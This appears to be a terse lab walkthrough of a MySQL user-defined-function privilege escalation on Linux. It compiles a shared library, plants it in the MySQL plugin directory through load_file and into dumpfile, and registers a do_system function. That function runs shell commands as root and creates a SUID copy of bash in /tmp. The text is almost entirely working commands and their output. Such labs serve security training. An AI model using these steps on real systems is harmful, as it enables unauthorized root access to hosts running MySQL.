# compile the .c file & generate an .so file

gcc -g -c user_udf2.c -fPIC
gcc -g -shared -Wl,-soname,user_udf2.so -o user_udf2.so user_udf2.o -lc -fPIC

# Login to mysql database now!

mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/home/user/user_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/user_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'user_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+--------------+----------+
| name      | ret | dl           | type     |
+-----------+-----+--------------+----------+
| do_system |   2 | user_udf2.so | function |
+-----------+-----+--------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('id > /tmp/out; chown user.user /tmp/out');
+------------------------------------------------------+
| do_system('id > /tmp/out; chown user.user /tmp/out') |
+------------------------------------------------------+
|                                                    0 |
+------------------------------------------------------+
1 row in set (0.00 sec)

mysql> \! sh
sh-4.1$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
sh-4.1$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
sh-4.1$ exit
exit

# Create a rootbash shell with SUID permissions, & that can help us get a shell as a root user.
# thus we have exploited the mysql successfully.

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
user@debian:~$ ls -ltr /tmp/rootbash
-rwsr-s--x 1 root root 926536 May 11 05:47 /tmp/rootbash
user@debian:~$ cd /tmp
user@debian:/tmp$ ./rootbash
rootbash-4.1$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rootbash-4.1$ quit
rootbash: quit: command not found
rootbash-4.1$ exit
exit

